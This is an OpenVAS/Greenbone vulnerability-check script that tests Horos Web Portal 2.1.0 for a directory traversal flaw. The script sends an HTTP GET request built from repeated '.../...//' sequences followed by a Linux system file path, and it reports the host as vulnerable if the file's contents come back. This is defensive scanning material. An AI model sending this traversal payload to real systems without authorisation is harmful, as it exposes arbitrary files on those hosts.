CPE = "cpe:/a:horos:horos";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.107115" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2016-12-28 13:26:09 +0700 (Wed, 28 Dec 2016)" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_name( "Horos Web Portal Directory Traversal Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with Horos Web Portal and is prone to a directory traversal vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request
  and check whether it is able to read a specific file or not." );
	script_tag( name: "insight", value: "Horos suffers from a file disclosure vulnerability when input passed through the
  URL path is not properly verified before being used to read files." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers
  to read arbitrary files." );
	script_tag( name: "affected", value: "Horos Web Portal version 2.1.0" );
	script_tag( name: "solution", value: "Apply the latest updated supplied by the vendor." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5387.php" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_horos_detect.sc", "os_detection.sc" );
	script_mandatory_keys( "horos/installed" );
	script_require_ports( "Services/www", 3333 );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
files = traversal_files( "linux" );
if(dir == "/"){
	dir = "";
}
for file in keys( files ) {
	url = dir + "/" + crap( data: ".../...//", length: 10 * 9 ) + files[file];
	if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: file )){
		report = http_report_vuln_url( port: http_port, url: url );
		security_message( port: http_port, data: report );
		exit( 0 );
	}
}
exit( 99 );

